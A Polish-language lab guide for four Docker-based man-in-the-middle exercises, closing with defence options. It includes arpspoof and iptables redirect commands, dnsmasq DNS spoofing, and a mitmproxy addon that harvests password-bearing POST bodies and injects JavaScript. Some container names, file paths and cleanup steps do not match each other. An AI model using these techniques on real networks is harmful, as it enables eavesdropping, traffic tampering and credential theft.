# Scenariusze Ataków Man-in-the-Middle (MitM) z Wykorzystaniem Docker

## Krótkie streszczenie

Poniżej przedstawiam **cztery praktyczne scenariusze ataku Man-in-the-Middle** z wykorzystaniem kontenerów Docker, które można wdrożyć w środowisku testowym. Każdy scenariusz ilustruje inną technikę ataku (ARP spoofing, DNS spoofing, SSL stripping i przechwytywanie HTTP), zawiera dokładne instrukcje konfiguracji, wymagane narzędzia oraz krokowe procedury wykonania. Wszystkie scenariusze są edukacyjne i powinny być przeprowadzane wyłącznie w izolowanym środowisku laboratoryjnym.

---

## Scenariusz 1: Atak ARP Spoofing z przechwytywaniem ruchu


### Opis scenariusza

Jest to klasyczny atak Man-in-the-Middle polegający na podrobieniu adresów ARP (Address Resolution Protocol) w celu przekierowania ruchu sieciowego przez maszynę atakującego (Attacker01). Trzy kontenery Docker (Client01, Server01 i Attacker01) są połączone w sieci Docker bridge. Client01 wysyła żądania HTTP do serwera Server01, ale ruch przechodzi przez Attacker01, który może obserwować i modyfikować komunikację.

### Wymagane zasoby

- **System operacyjny**: Linux/Windows/MacOs z zainstalowanym Docker, docker-compose oraz opcjonalnie git
- **Narzędzia**: arpspoof, mitmproxy, tcpdump, dig, Wireshark/tcpdump
- **Wielkość**: Około 500 MB miejsca na dysku
- **Pamięć RAM**: Minimum 2 GB
- **Czas setup**: 5-10 minut
- **Trzy kontenery**: Client01 (klient/ofiara), Server01 (serwer HTTP), Attacker01 (atakujący)


### Architektura sieciowa

```
┌──────────────────────────────────────────────────────────────────────────┐
│                    Sieć Docker Bridge                                    │
│                    (bridge: mitm_network)                                │
│                                                                          │
│  ┌────────────────────────────────────────────────────────┐              │
│  │   Client01 (IP: 172.20.0.2)                            │              │
│  │   - Firefox/Lynx                                       │              │
│  │   - Client HTTP                                        │              │
│  └───────┬────────────────────────────────────────────────┘              │	
│          │                              ▲                                │
│          │	ARP Request:              │                                │   
│          │ 	  Where is "Server01"     │                                │
│          │                              │ ARP Reply:                     │
│          │                              │   I am "Server01"              │
│          │                              │   (MAC: "Attacker01" MAC)      │
│          ▼                              │                                │
│  ┌──────────────────────────────────────┴────────────────┐               │
│  │   Attacker01 (IP: 172.20.0.3)                         │               │
│  │ - arpspoof                                            │               │
│  │ - mitmproxy                                           │               │
│  │ - tcpdump                                             │               │
│  └───────────────────────────────────────────────────────┘               │
│           │                             ▲                                │
│           │                             │                                │
│           │                             │                                │
│           ▼                             ▼                                │
│  ┌────────────────────────┐     ┌─────────────────────────────────┐      │ 
│  │   Wireshark/tcpdump    │     │   Server01 (IP: 172.20.0.4)     │ 	   │
│  │   (Packet Analysis)    │     │   - HTTP Server                 │	   │
│  │                        │     │   - Nginx                       │	   │
│  └────────────────────────┘     └─────────────────────────────────┘      │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

### Krok 0: Pobranie konfiguracji z repozytorium


Cała konfiguracja może zostać pobrana z repozytorium lub utworzona ręcznie. Kroki 1 - 4 opisują proces tworzenia konfiguracji ręcznie, można je pominąć jeżeli pobieramy konfigurację z repozytorium. 


W systemie Windows należy wymusić wyłączenie zmiany znaku końca linii przez git, w innym przypadku mogą wystąpić problemy z plikami *.sh w kontenerze. Znak końca linii powinien być ustawiony w tych plikach na Unix (LF).
```
git config --global core.autocrlf false
```


Wykonujemy polecenia w teminalu:

```
git clone https://github.com/mateuszskala/BiNSC.git binsc_mitm
cd binsc_mitm/Lab01
```

Jeżeli wszystko pobrało się poprawnie i struktura katalogów jest poprawna można przejść od razu do kroku 5 jednak warto zweryfikować konfigurację i zapoznać się z zawartością plików opisanych w krokach 1-4 aby lepiej zrozumieć przebieg zdarzeń.


### Krok 1 (opcjonalnie): Przygotowanie struktury katalogów

```bash
mkdir -p bsc_mitm/Lab01
cd bsc_mitm/Lab01
mkdir -p client01_files server01_files attacker01_files
```

### Krok 2 (opcjonalnie): Tworzenie Dockerfile dla kontenerów

**Dockerfile dla client01**
```dockerfile
FROM ubuntu:22.04
RUN apt-get update && apt-get install -y \
    curl \
    iputils-ping \
    net-tools \
    dnsutils \
    tcpdump \
    telnet \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /workspace
CMD ["/bin/bash"]
```

**Dockerfile dla server01**
```dockerfile
FROM nginx:alpine
COPY server01_files/index.html /usr/share/nginx/html/
EXPOSE 80
CMD ["nginx", "-g", "daemon off;"]
```

**Dockerfile dla attacker01**
```dockerfile
FROM ubuntu:22.04
RUN apt-get update && apt-get install -y \
    dsniff \
    mitmproxy \
    tcpdump \
    net-tools \
    dnsutils \
    iptables \
    netcat \
    vim \
    && rm -rf /var/lib/apt/lists/*

RUN echo "1" > /proc/sys/net/ipv4/ip_forward

WORKDIR /workspace
CMD ["/bin/bash"]
```

### Krok 3 (opcjonalnie): Tworzenie pliku docker-compose.yml

```yaml
services:
  client01:
    build:
      context: .
      dockerfile: Dockerfile.client01
    container_name: mitm_client01
    networks:
      mitm_network:
        ipv4_address: 172.20.0.2
    volumes:
      - ./client01_files:/workspace
    stdin_open: true
    tty: true

  server01:
    build:
      context: .
      dockerfile: Dockerfile.server01
    container_name: mitm_server01
    networks:
      mitm_network:
        ipv4_address: 172.20.0.4
    volumes:
      - ./server01_files:/workspace
    expose:
      - "80"
    environment:
      - NGINX_HOST=server01
      - NGINX_PORT=80

  attacker01:
    build:
      context: .
      dockerfile: Dockerfile.attacker01
    container_name: mitm_atacker01
    networks:
      mitm_network:
        ipv4_address: 172.20.0.3
    volumes:
      - ./atacker01_files:/workspace
    cap_add:
      - NET_ADMIN
      - SYS_ADMIN
    devices:
      - /dev/net/tun
    stdin_open: true
    tty: true

networks:
  mitm_network:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/24
```

### Krok 4 (opcjonalnie): Przygotowanie plików konfiguracyjnych

**server01_files/index.html** (oryginalny serwer)
```html
<!DOCTYPE html>
<html>
<head>
    <title>Secure Server01</title>
    <style>
        body { font-family: Arial; margin: 40px; background-color: #e8f5e9; }
        .secure { border: 3px solid green; padding: 20px; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="secure">
        <h1>🔒 Welcome to Secure Server01</h1>
        <p>This is the ORIGINAL server hosted by Server01</p>
        <p>Status: <span style="color: green;">✓ LEGITIMATE</span></p>
        <p>If you see this page, connection is secure!</p>
    </div>
</body>
</html>
```

**attacker01_files/add_iptables_rule.sh** (skrypt do konfiguracji)
```bash
#!/bin/bash
# Enable IP forwarding
sysctl -w net.ipv4.ip_forward=1

# Add iptables rule to redirect port 80 to mitmproxy
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

echo "iptables rules added successfully"
iptables -L -t nat
```

**attacker01_files/del_iptables_rule.sh** (usuwanie reguł)
```bash
#!/bin/bash
# Remove iptables rule
iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

# Disable IP forwarding (optional)
sysctl -w net.ipv4.ip_forward=0

echo "iptables rules removed"
```

**attacker01_files/proxy.py** (skrypt modyfikujący strony)
```python
from mitmproxy import http

def request(flow: http.HTTPFlow) -> None:
    print(f"[MitM] Request: {flow.request.url}")

def response(flow: http.HTTPFlow) -> None:
    # Modyfikacja odpowiedzi HTTP
    filename = 'index_modified.html'
    with open(filename, mode='rb') as f:
        content = f.read()
    print('Sendig modified content!')
    if flow.response.content:
        flow.response.content = content
```

**attacker01_files/index_modified.html** (podmieniona strona www)
```html
<!DOCTYPE html>
<html>
<head>
    <title>INTERCEPTED PAGE</title>
    <style>
        body { font-family: Arial; margin: 40px; background-color: #ffebee; }
        .warning { border: 3px solid red; padding: 20px; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="warning">
        <h1>⚠️ WARNING - PAGE INTERCEPTED</h1>
        <p>This page has been modified by the Attacker01</p>
        <p>Original connection was compromised via ARP Spoofing</p>
        <p style="color: red;"><strong>This demonstrates MitM attack vulnerability</strong></p>
    </div>
</body>
</html>
```

### Krok 5: Instrukcje wykonania ataku

#### Uruchomienie kontenerów
W istniejącym terminalu (Terminal0 - host) będąc w katalogu Lab01 uruchamiamy polecenia.
```bash
# Budowanie i uruchamianie
docker-compose build
docker-compose up -d

# Weryfikacja działania
docker-compose ps
```

Jeżeli wszystko działa poprawnie uruchamiamy zapisywanie całej komunikacji do pliku *.pcap za pomocą tcpdump, który wykorzystamy na końcu laboratorium do analizy.

```bash
# Uruchomienie tcpdump w Attacker01 (przesłanie do hosta)
docker exec mitm_attacker01 tcpdump -i any -w /tmp/capture.pcap
```
Terminal0 pozostawiamy otwarty.

![](Lab01/screenshots/scr01.png)

#### Konfiguracja środowiska ataku 
Prze przystąpieniem do konfiguracji należy zweryfikować czy plik add_iptables_rule.sh jest zapisany jako Linux (LF), w innym przypadku mogą wystąpić problemy z uruchomieniem pliku.

Następnie otwieramy kolejny terminal i konfigurujemy maszynę Attacker01 (Terminal1 w Attacker01)
```bash
# Wejście do kontenera Attacker01
docker exec -it mitm_attacker01 /bin/bash

# Sprawdzenie adresów IP serwera i klienta
dig client01
dig server01

# Uczynienie skryptu wykonywalnym i dodanie reguły iptables
chmod +x /workspace/add_iptables_rule.sh
/workspace/add_iptables_rule.sh
```

![](Lab01/screenshots/scr02.png)


![](Lab01/screenshots/scr03.png)

W drugim terminalu (Terminal2) wchodzimy do kontenera Client01 i weryfikujemy aktualne dane w ARP Cache
```bash
docker exec -it mitm_client01 /bin/bash

# Sprawdzamy adres serwera 
ping -c 1 server01

# Weryfikacja ARP cache
ip neighbor

# Test HTTP
curl http://server01

#Ewentualnie możemy wykorzystać lynx
lynx http://server01
```


![](Lab01/screenshots/scr04.png)

Otwiera się niezmodyfikowana strona z serwer01.

![](Lab01/screenshots/scr05.png)

#### ARP Spoofing (w dwóch terminalach Attacker01)
Należy uruchomić dwa dodatkowe terminale i wejść w nich do kontenera Attacker01 za pomocą polecenia
```bash
docker exec -it mitm_attacker01 /bin/bash
```

W każdym z nich uruchamiamy polecenia

Terminal3 (attacker01):
```bash
# Spoofowanie Client01 -> Server01
arpspoof -t 172.20.0.2 172.20.0.4
```

![](Lab01/screenshots/scr06.png)

Terminal4 (attacker01):
```bash
# Spoofowanie Server01 -> Client01
arpspoof -t 172.20.0.4 172.20.0.2
```

![](Lab01/screenshots/scr07.png)

Za pomocą tych dwóch poleceń Attacker01 infekuje pamięć podręczną tablicy ARP informując, że jego adres fizyczny MAC odpowiada pod adresami IP serwera Server01 oraz klienta Client01, co spowoduje przesłanie informacji przez jego odpowiednio skonfigurowaną maszynę (zatem maszyna Attacker01 stanie się elementem pośredniczącym w komunikacji -> Man in the Middle!)

Terminale 3 i 4 pozostawiamy uruchomione i wracamy do Terminal2 (client01)

W Terminal2 sprawdzamy ponownie pamięć ARP Cache aby potwierdzić zmianę adresu MAC dla serwera.

```bash
ip neighbor
```

![](Lab01/screenshots/scr08.png)

#### Uruchomienie mitmproxy
Kolejnym krokiem jest uruchomienie mitmproxy, dzięki któremu możemy obserwować komunikację przechodzącą przez kontener Attacker01 jak również modyfikować zawartość pakietów.

Na początek uruchomimy mitmproxy bez modyfikacji pakietów i zaobserwujemy, że zapytania wysłane przez Client01 docierają do Server01 i odwrotnie.

Terminal1 (Attacker01) - Bez modyfikacji:
```bash
mitmproxy -m transparent --listen-port 8080
```

W Terminalu2 (Client01) uruchamiamy polecenie wykonujące zapytanie GET do Server01, może to być curl
```
curl http://server01
```

lub terminalowa przeglądarka lynx:
```
lynx http://server01
```

W Terminalu1 (Attacker01) można zaobserwować zapytanie wysłane z Client01 do Server01 i odpowiedź serwera.

![](Lab01/screenshots/scr09.png)

![](Lab01/screenshots/scr10.png)

![](Lab01/screenshots/scr11.png)

![](Lab01/screenshots/scr12.png)

Zamykamy mitmproxy wciskając q, y

Następnie uruchamiamy mitmproxy wraz ze skryptem proxy.py który modyfikuje zawartość odpowiedzi od serwera:
```bash
mitmproxy -m transparent --listen-port 8080 -s /workspace/proxy.py
```

Ponownie w Terminalu2 (Client01) wykonujemy polecenie curl lub uruchamiamy lynx, w Terminalu1 (Attacker01) obserwujemy nowe zapytania, a w Teminalu2 (Client01) mamy teraz inną (zmodyfikowaną) stronę internetową.

![](Lab01/screenshots/scr13.png)

![](Lab01/screenshots/scr14.png)

![](Lab01/screenshots/scr15.png)

![](Lab01/screenshots/scr16.png)

#### Analiza ruchu (Wireshark)
W tym momencie możemy zamknąć terminale 1-4 - nie będą już potrzebne.

Na maszynie hosta (Terminal0) zatrzymujemy tcpdump za pomocą Ctrl+c i  uruchamiamy polecenie kopiujące plik capture.pcap do lokalnego systemu plików.

```bash
# Skopiowanie pliku na hosta
docker cp mitm_attacker01:/tmp/capture.pcap ./capture.pcap

# Otwieranie w Wireshark
wireshark ./capture.pcap
```
![](Lab01/screenshots/scr17.png)

### Krok 6: Analiza i zadania
Po skopiowaniu pliku *.pcap na lokalny komputer należy przeanalizować jego zawartość. W trakcie analizy należy pokazać kluczowe miejsca ataku, w szczególności:
* pakiety przed wykonaniem ataku
* pakiety po wykonaniu spoofingu ale bez modyfikacji
* należy wskazać pakiety po wykonaniu spoofingu wraz ze zmodyfikowaną odpowiedzią.

Czy w pliku znajdują się pakiety które wysłał Client01 do Server01 przed wykonaniem spoofingu (polecenie arpspoof)?

### Krok 7. Czyszczenie systemu
W Terminalu0 uruchamiamy polecenie które usunie wszystkie kontenery:
```bash
docker-compose down --rmi all --volumes
```


![](Lab01/screenshots/scr18.png)

### Wskaźniki sukcesu

- ✓ ARP cache w Client01 pokazuje Mac adres Attacker01 dla IP Server01
- ✓ mitmproxy wyświetla przechodzące żądania HTTP
- ✓ Strona w przeglądarce Client01 zmienia się z zielonej na czerwoną
- ✓ tcpdump pokazuje przepływ ruchu przez Attacker01
- ✓ Logi mitmproxy rejestrują wszystkie żądania

---




## Scenariusz 02: Atak DNS Spoofing


### Pobieranie projektu

Polecenia:
```bash
git clone https://github.com/mateuszskala/BiNSC.git
cd BiNSC/Lab02
```

### Weryfkacja plików

* docker-compose.yml - plik definiujący kontenery scenariusza
* Dockerfile.attacker - plik definiujący obraz kontenera atakującego
* Dockerfile.client - plik definiujący obraz kontenera ofiary
* folder attacker_fles - pliki konfiguracyjne i skrypty dla kontenera atakującego
* 
### Uruchomienie środowiska i struktura sieci
Polecenia:
```bash
docker-compose build
docker-compose up -d
docker ps
```

W sieci znajdują się 2 kontenery oraz domyślna brama, mają przypisane
nasętpujące adresy IP:
* dns_attacker - 172.30.1.10
* dns_client - 172.30.1.5
* brama - 172.30.1.1

Otwieramy 2 okna terminala, w pierwszym łączymy się z kontenerem atakującym, w drugim z kontenerem ofiary:

```bash
docker exec -it dns_attacker bash
docker exec -it dns_client bash
```

### Weryfikacja komunikacji z siecią zewnętrzną

Na kontenerze ofiary sprawdzamy adresy MAC bramy i atakującego:

```bash
ping 172.30.1.10
ping 172.30.1.1
arp -a
```

Warto zanotować je do późniejszej weryfikacji. Następnie sprawdzamy czy
komunikacja z siecią zewnętrzną działa poprawnie:
```bash
ping wp.pl
ping allegro.pl
ping google.com
...
curl wp.pl -i
curl allegro.pl -i
curl google.com -i
```

Również warto zanotować adres IP domeny wp.pl oraz odpowiedź na zapytanie
http do późniejszej weryfikacji.

### ARP poisoning

Na kontenerze atakującym otwieramy nowe okna terminala i uruchamiamy w
nich narzędzie arpspoof, możemy w kolejnym oknie otworzyć również narzędzie
tshark do śledzenia przepływu pakietów:

```bash
arpspoof -t 172.30.1.5 172.30.1.1
arpspoof -t 172.30.1.1 172.30.1.5
tshark -i eth0 -Y "dns or tls or http"
```

Następnie na kontenerze ofiary znów sprawdzamy tablice ARP:
```bash
arp -a
```

Adres bramy powinien być teraz taki sam jak atakującego.

### Uruchomienie Dnsmasq

Na kontenerze atakującym dodajemy 2 reguły do iptables i uruchamiamy usługę
Dnsmasq:
```bash
iptables -t nat -A PREROUTING -i eth0 -p udp --dport 53 -j REDIRECT --to-port 53
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 53 -j REDIRECT --to-port 53
service dnsmasq start
```

Na kontenerze ofiary sprawdzamy ponownie komunikacje z siecią zewnętrzną:
```bash
ping wp.pl
ping allegro.pl
ping google.com
...
curl wp.pl -i
curl allegro.pl -i
curl google.com -i
...
```

Adres IP domeny wp.pl powinien być teraz 172.30.1.10, a odpowiedź na
zapytanie http wyglądać mniej więcej tak:
```html
<html>
<body>
<h1>Witaj! Ta domena zostaªa przej¦ta.</h1>
</body>
</html>
```

Podczas setupu uruchamiany jest prosty skrypt responder.py, który nasłuchuje
na porcie 80 i zwraca powyższą stronę dla każdej przychodzącej prośby HTTP.

### Modyfikacja konfiguracji Dnsmasq

Plik konfiguracyjny dla Dnsmasq znajduje się w /etc/dnsmasq.conf. Możemy
zmodyfikować istniejące linie address lub dodać nową regułę. Na przykład:
```bash
address=/wp.pl/172.30.1.10 -> address=/google.com/172.30.1.10
address=/youtube.com/172.30.1.10
address=/#/172.30.1.10 #modyfikacja każdej domeny
```

Następnie restartujemy usługę Dnsmasq:
```bash
service dnsmasq restart
```

### Zakończenie ataku

Aby przerwać atak kończymy proces w oknie, w którym uruchomiono arpspoof
(CTRL+C). Oraz wpisujemy polecenie:
```bash
iptables -t nat -F PREROUTING
```

Nasętpnie na kontenerze ofiary ponownie sprawdzamy tablice ARP, adresy
MAC powinny być różne tak jak na początku:
```bash
arp -a
```
Weryfikujemy również adres IP atakowanej domeny

---

## Scenariusz 3: SSL Stripping z HTTP Toolkit

### Opis scenariusza

SSL stripping to technika polegająca na usuwaniu szyfrowania HTTPS i konwersji komunikacji na nieszyfrowane HTTP. W tym scenariuszu implementujemy transparentny proxy używając mitmproxy, który przechwytuje i deszyfruje ruch HTTPS, pozwalając atakującemu czytać i modyfikować zawartość komunikacji. Klient jest automatycznie routowany przez interceptor bez wiedzy o przechwytywaniu, symulując prawdziwy atak Man-in-the-Middle.

### Pełna dokumentacja

Kompletne instrukcje krok po kroku, konfiguracja Docker, skrypty automatyzujące oraz szczegółowe procedury testowania znajdują się w:

**[Lab03/README.md](Lab03/README.md)**

Laboratorium obejmuje:
- Konfigurację transparentnego proxy z automatycznym routingiem
- Przechwytywanie i deszyfrowanie ruchu HTTP/HTTPS
- Logowanie szczegółów żądań i odpowiedzi
- Analizę przechwyconych danych z użyciem tcpdump i mitmproxy
- Demonstrację przechwytywania danych uwierzytelniających w plain-text

---

## Scenariusz 4: HTTP Request/Response Interception z Modyfikacją

### Opis scenariusza

Najbardziej zaawansowany scenariusz demonstrujący pełną kontrolę nad komunikacją HTTP/HTTPS. Atakujący może przeglądać, modyfikować i injektować zawartość w żądaniach i odpowiedziach.

### Wymagane zasoby

- **Docker**
- **mitmproxy z custom scriptami Python**
- **Rozmiar**: Około 250 MB

### Konfiguracja

**Dockerfile dla advanced interceptor**
```dockerfile
FROM python:3.10-slim

RUN pip install mitmproxy==9.3.1 requests

WORKDIR /app
COPY intercept_advanced.py /app/

RUN apt-get update && apt-get install -y \
    iptables \
    net-tools \
    tcpdump \
    && rm -rf /var/lib/apt/lists/*

CMD ["mitmproxy", "-m", "transparent", "-s", "/app/intercept_advanced.py"]
```

**intercept_advanced.py** (zaawansowany skrypt intercepcji)
```python
import json
import os
from mitmproxy import http, ctx
from datetime import datetime

# Konfiguracja
LOG_DIR = "/app/logs"
os.makedirs(LOG_DIR, exist_ok=True)

class Interceptor:
    def __init__(self):
        self.request_count = 0
        self.captured_credentials = []
        
    def request(self, flow: http.HTTPFlow) -> None:
        self.request_count += 1
        
        # Logging żądania
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "method": flow.request.method,
            "url": flow.request.pretty_url,
            "headers": dict(flow.request.headers),
            "client_ip": flow.client_conn.address[0],
        }
        
        # Captura danych logowania
        if flow.request.method == "POST":
            try:
                content = flow.request.get_text()
                log_entry["body"] = content
                
                # Szukanie danych logowania
                if "password" in content.lower() or "credentials" in content.lower():
                    self.captured_credentials.append(log_entry)
                    ctx.log.warn(f"[!] Potencjalne dane logowania: {content[:100]}")
            except:
                pass
        
        # Zapisanie logu
        with open(f"{LOG_DIR}/requests.log", "a") as f:
            f.write(json.dumps(log_entry) + "\n")
        
        ctx.log.info(f"Request #{self.request_count}: {flow.request.pretty_url}")
    
    def response(self, flow: http.HTTPFlow) -> None:
        # Modyfikacja odpowiedzi
        if "example.com" in flow.request.host:
            if flow.response.status_code == 200:
                if "text/html" in flow.response.headers.get("content-type", ""):
                    # Injection JavaScriptu
                    injection = b"""
                    <script>
                    console.log("This page has been modified by MitM");
                    // Można tu injektować złośliwy kod
                    </script>
                    """
                    flow.response.content = injection + flow.response.content
                    ctx.log.warn("[!] Zawartość HTML została zmodyfikowana")
        
        # Logowanie odpowiedzi
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "url": flow.request.pretty_url,
            "status": flow.response.status_code,
            "response_size": len(flow.response.content),
        }
        
        with open(f"{LOG_DIR}/responses.log", "a") as f:
            f.write(json.dumps(log_entry) + "\n")

addons = [Interceptor()]
```

**docker-compose-scenario4.yml**
```yaml
version: '3.8'

services:
  client:
    image: ubuntu:22.04
    container_name: advanced_client
    networks:
      intercept_network:
        ipv4_address: 172.23.0.2
    environment:
      - HTTP_PROXY=http://172.23.0.3:8080
      - HTTPS_PROXY=http://172.23.0.3:8080
    volumes:
      - ./client_scripts:/workspace
    command: /bin/sleep 3600
    stdin_open: true
    tty: true

  interceptor:
    build:
      context: .
      dockerfile: Dockerfile.advanced_interceptor
    container_name: advanced_interceptor
    networks:
      intercept_network:
        ipv4_address: 172.23.0.3
    cap_add:
      - NET_ADMIN
      - SYS_ADMIN
    volumes:
      - ./intercept_logs:/app/logs
      - ./intercept_scripts:/app
    stdin_open: true
    tty: true

  web_server:
    image: httpbin/httpbin:latest
    container_name: httpbin_server
    networks:
      intercept_network:
        ipv4_address: 172.23.0.4
    expose:
      - "80"

networks:
  intercept_network:
    driver: bridge
    ipam:
      config:
        - subnet: 172.23.0.0/24
```

### Fazy zaawansowanego interception

**Faza 1: Setup**
```bash
docker-compose -f docker-compose-scenario4.yml build
docker-compose -f docker-compose-scenario4.yml up -d
```

**Faza 2: Konfiguracja iptables i uruchomienie interception**
```bash
docker exec -it advanced_interceptor bash

sysctl -w net.ipv4.ip_forward=1

iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080

mitmproxy -m transparent -s /app/intercept_advanced.py --listen-port 8080
```

**Faza 3: Generowanie ruchu z klienta**
```bash
docker exec -it advanced_client bash

apt-get update && apt-get install -y curl

# Test zapytań
for i in {1..10}; do
  curl -s http://httpbin.org/get?param=$i
  curl -s -X POST http://httpbin.org/post -d "username=user&password=secret123"
done

# Obserwacja logów
watch -n 1 'tail -f /app/logs/requests.log'
```

**Faza 4: Analiza captured danych**
```bash
# Obejrzenie przechwyconych żądań
docker exec advanced_interceptor cat /app/logs/requests.log | jq .

# Obejrzenie przechwyconych odpowiedzi
docker exec advanced_interceptor cat /app/logs/responses.log | jq .
```

### Wskaźniki sukcesu

- ✓ Wszystkie żądania HTTP/HTTPS są zalogowane
- ✓ Dane POST są przechwycone i wyświetlane
- ✓ Zawartość HTML jest modyfikowana on-the-fly
- ✓ Pliki logów zawierają wszystkie szczegóły połączeń

---

## Opcje obrony i detekcji

### Dla każdego scenariusza można wdrożyć mechanizmy obrony:

**Detekcja ARP Spoofing (Scenariusz 1)**
- Monitoring zmian ARP cache
- Statyczne wpisy ARP dla krytycznych urządzeń
- Narzędzia: ArpWatch, Snort

**Obrona DNS (Scenariusz 2)**
- DNSSEC dla weryfikacji autentyczności
- DNS over HTTPS (DoH)
- DNS over TLS (DoT)
- RPZ (Response Policy Zones)

**Zabezpieczenie SSL/TLS (Scenariusz 3)**
- Certificate pinning
- HSTS (HTTP Strict Transport Security)
- Monitorowanie logów certyfikatów
- Narzęzia: Let's Encrypt Cert Transparency

**Ochrona HTTP (Scenariusz 4)**
- HTTPS everywhere
- Input validation
- Content Security Policy (CSP)
- Intrusion Detection Systems (IDS)

---

## Wymagane komendy do czyszczenia

```bash
# Zatrzymanie wszystkich scenariuszy
docker-compose -f docker-compose.yml down
docker-compose -f docker-compose-scenario2.yml down
docker-compose -f docker-compose-scenario3.yml down
docker-compose -f docker-compose-scenario4.yml down

# Usunięcie sieci
docker network prune -f

# Usunięcie obrazów
docker rmi mitm_alice mitm_bob mitm_eve evil_dns_server -f
```

---

Każdy scenariusz demonstruje rzeczywiste techniki ataku MitM stosowane przez atakujących, ale w izolowanym, edukacyjnym środowisku. Wszystkie eksperymenty powinny być przeprowadzane wyłącznie w własnym, izolowanym laboratorium testowym.